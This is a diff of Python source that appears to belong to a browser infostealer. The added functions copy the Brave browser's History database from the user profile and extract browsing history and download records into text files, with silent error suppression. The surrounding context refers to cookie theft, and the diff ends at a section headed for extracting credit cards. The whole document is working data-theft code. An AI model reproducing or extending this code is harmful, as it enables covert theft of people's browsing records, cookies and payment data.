@@ -194,3 +194,60 @@ d_fetch_cookies(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Ne
 ##Extract history
 ##
 
+def fetch_history(dir):
+    try:
+        file = os.path.join(os.environ["USERPROFILE"], dir)
+        shutil.copy(file, "history.db")
+        
+        conn = sqlite3.connect("history.db")
+        query = "SELECT url, title, visit_count, typed_count, last_visit_time FROM urls"
+        cursor = conn.execute(query)
+    except:
+        pass
+    
+    try:
+        for row in cursor:
+            url, title, visit_count, typed_count, last_visit = row
+            
+            history = f"\nURL: {url}\nTitle: {title}\nVisits: {visit_count}\nTyped: {typed_count}\nLast visit: {last_visit}\n"
+            store_data("history.txt", history)
+        conn.close()
+        delete_file("history.db")
+    except:
+        pass
+    
+    
+fetch_history(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")
+
+##
+##Extract downloads
+##
+
+def fetch_downloads(dir):
+    try:
+        file = os.path.join(os.environ["USERPROFILE"], dir)
+        shutil.copy(file, "history.db")
+        
+        conn = sqlite3.connect("history.db")
+        query = "SELECT target_path, total_bytes, end_time, opened, tab_url FROM downloads"
+        cursor = conn.execute(query)
+    except:
+        pass
+    
+    try:
+        for row in cursor:
+            target_path, total_bytes, end_time, opened, tab_url = row
+            
+            history = f"\nPath: {target_path}\nSize(bytes): {total_bytes}\nTime: {end_time}\nOpened: {opened}\nURL: {tab_url}\n"
+            store_data("downloads.txt", history)
+        conn.close()
+        delete_file("history.db")
+    except:
+        pass
+    
+fetch_downloads(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History")
+
+##
+##Extract credit cards
+##
+
